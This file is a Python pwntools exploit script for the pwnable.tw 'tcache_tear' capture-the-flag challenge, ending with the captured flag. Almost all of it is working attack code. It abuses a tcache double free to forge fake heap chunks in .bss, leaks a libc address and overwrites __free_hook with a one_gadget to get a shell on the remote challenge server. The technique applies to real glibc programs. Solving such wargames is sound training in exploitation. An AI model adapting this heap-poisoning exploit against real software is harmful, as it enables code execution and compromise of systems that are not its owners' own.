#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
# CUSTOM FUNCTIONS
def _snd(s):
  io.send(str(s))
def _sndl(s):
  io.sendline(str(s))
def _snda(a,s):
  io.sendafter(str(a),str(s))
def _sndla(a,s):
  io.sendlineafter(str(a),str(s))
def _rcvu(s):
  return io.recvuntil(str(s))
def _rcva():
  return io.recvall()
def _rcvn(n):
  return io.recv(n)
def _rcvl():
    return io.recvline()

exe = context.binary = ELF('tcache_tear')
libc = ELF('./libc.so')
env={'LD_PRELOAD':'./libc.so'}
#env={}

host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10207)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, env=env, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, env=env, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --

context.terminal = ['tmux', 'split', '-h']

def alloc(sz, data):
    _snda(':', 1)
    _snda(':', sz)
    _snda(':', data)
    pass

def free():
    _snda(':', 2)

def info():
    _snda(':', 3)

def quit():
    _snda(':', 4)

io = start()
if args.GDB:
    _rcvl()

# !!!!!!!!!!
# For some strange reason the memory area from 0x602000 to 0x603000 has RW permissions
# This should not happen when FULL RELRO is activated
# Strange, but useful

bss_chunk = 0x0000000000602060
header_sz = 0x10
_snda(':', p64(0x0)+p64(0x501)+p64(0)*4)
log.info('Prepared fake chunk header at {}'.format(hex(bss_chunk)))

# Create a fake chunk at bss_chunk + 0x500
# PREV_IN_USE = 1, PREV_SZ = 0x500
alloc(0x50, "AAAA")
free()
free()
alloc(0x50, p64(bss_chunk + 0x500))
alloc(0x50, "useless")
# TODO
# for whatever reason, i need to forge two fake chunks in order to pass the checks
# sometimes i get SIGABRT
# this should be investigated
alloc(0x50, p64(0x0) + p64(0x21) + p64(0x0)*3 + p64(0x21))
log.info('Forged two chunks at {}'.format(hex(bss_chunk + 0x500)))

# Create a fake chunk at bss_chunk
# SZ = 0x500, it will be moved to unsorted bin
alloc(0x60, "BBBB")
free()
free()
alloc(0x60, p64(bss_chunk + header_sz))
alloc(0x60, "useless")
alloc(0x60, p64(0x0))
free()
log.success("Inserted fake chunk into unsorted bin")

info()
io.recvuntil('Name :')
io.recv(16)

addr = unpack(io.recv(8))
log.success('Leaked: {}'.format(hex(addr)))

offset = 0x3ebca0
libc.address = addr - offset
log.info('Libc base: {}'.format(hex(libc.address)))

# Force malloc to return a pointer at __free_hook
alloc(0x70, "CCCC")
free()
free()
alloc(0x70, p64(libc.symbols['__free_hook']))
alloc(0x70, "useless")
log.info('Got chunk at {} ({})'.format(hex(libc.symbols['__free_hook']), '__free_hook'))

gadgets = [0x4f2c5, 0x4f322, 0x10a38c]
alloc(0x70, p64(libc.address + gadgets[1]))
alloc(0xff, "test")
free()
log.success('Spawned shell')

io.interactive()
# FLAG{tc4ch3_1s_34sy_f0r_y0u}
